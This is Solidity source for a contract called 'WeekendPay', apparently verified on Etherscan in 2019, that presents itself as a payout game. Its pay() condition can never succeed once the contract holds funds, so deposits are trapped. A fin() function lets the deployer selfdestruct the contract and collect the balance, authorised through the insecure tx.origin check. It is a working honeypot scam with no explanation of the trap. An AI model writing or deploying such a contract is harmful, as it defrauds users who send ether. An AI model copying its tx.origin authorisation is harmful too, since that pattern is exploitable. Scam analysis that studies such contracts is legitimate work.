/**
 *Submitted for verification at Etherscan.io on 2019-02-16
*/

pragma solidity ^0.4.25;

contract WeekendPay
{
    address O = tx.origin;

    function() public payable {}

    function pay() public payable {
        if (msg.value >= this.balance) {
            tx.origin.transfer(this.balance);
        }
    }
    function fin() public {
        if (tx.origin == O) {
            selfdestruct(tx.origin);
        }
    }
 }